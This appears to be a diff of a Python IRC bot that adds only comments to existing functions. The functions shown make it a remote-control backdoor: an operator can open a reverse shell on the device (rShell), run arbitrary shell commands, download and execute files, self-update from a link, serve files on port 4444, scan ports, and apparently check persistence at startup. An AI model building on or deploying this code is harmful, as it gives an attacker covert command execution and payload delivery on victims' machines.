@@ -86,7 +86,7 @@ ircsock.settimeout(240) # Set socket timeout.
 connected = False # Variable to say if bot is connected or not.
 
 def ircsend(msg):
-    ircsock.send(bytes(str(msg) +"\n", "UTF-8"))
+    ircsock.send(bytes(str(msg) +"\n", "UTF-8")) # Send data to IRC server.
 
 def connect():
     global connected
@@ -114,8 +114,8 @@ def connect():
             reconnect()
 
 def reconnect():
-    global connected
-    global ircsock
+    global connected # Set 'connected' variable
+    global ircsock # Set 'ircsock' variable
     while not connected:
         ircsock.close() # Close previous socket.
         ircsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Set ircsock variable.
@@ -209,7 +209,7 @@ def nmapScan(tgtHost, tgtPort): # Use nmap to scan ports on an ip address with .
         st = '[-]'
     sendmsg((st + " " + tgtHost + " tcp/" +tgtPort + " -" + state), adminname)
 
-def rShell(rsHost, rsPort):
+def rShell(rsHost, rsPort): # Open a reverse shell on this device.
     try:
         rs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         rs.connect_ex((str(rsHost), int(rsPort)))
@@ -242,7 +242,7 @@ def rShell(rsHost, rsPort):
             print("rShell Socket Connection Exception: " + str(rsconnex))
     rs.close()
     
-def runcmd(sc):
+def runcmd(sc): # Run shell commands on this device.
     proc = subprocess.Popen(shlex.split(sc), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     while True:
         line = proc.stdout.readline()
@@ -262,17 +262,17 @@ def runcmd(sc):
     sendntc(pp, adminname)
     sendntc("Shell> Done.", adminname)
     
-def runcmd_noout(sc):
+def runcmd_noout(sc): # Run shell commands with any feedback output.
     proc = subprocess.Popen(sc, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 
 def setmode(flag, target=channel): # Sets given mode to nick or channel.
     ircsend("MODE "+ target +" "+ flag)
     
-def download(link, file):
+def download(link, file): # Download a file.
     urllib.request.urlretrieve(str(link), str(file))
     sendntc(str(file) +" was successfully downloaded from "+ str(link) +"!", adminname)
 
-def execute(xType, file):
+def execute(xType, file): # Run executable file.
     if xType == 'ex':
         exec(open(str(file)).read())
     if type == 'sys':
@@ -280,12 +280,12 @@ def execute(xType, file):
     else:
         runcmd_noout('./'+ file)
     
-def update(link, file):
+def update(link, file): # Update bot.
     download(link, file)
     runcmd_noout('./' + file)
     sys.exit()
 
-def retrieveFile(fsname, fs, fsaddr):
+def retrieveFile(fsname, fs, fsaddr): # Receive a file.
     filename = fs.recv(1024).decode("UTF-8")
     if os.path.isfile(filename):
         fs.sendto(str.encode("EXISTS " + str(os.path.getsize(filename))), fsaddr)
@@ -301,7 +301,7 @@ def retrieveFile(fsname, fs, fsaddr):
         fs.sendto(str.encode("ERR"), fsaddr)
     fs.close()
 
-def fileServer():
+def fileServer(): # Open a file server on this device.
     host = '127.0.0.1'
     port = 4444
     s = socket.socket()
@@ -319,7 +319,7 @@ def fileServer():
         t.start()
     s.close()
 
-def srtChk():
+def srtChk(): # Startup Check.
     script = sys.argv
     name = str(script[0])
     hd = str(os.path.expanduser('~'))
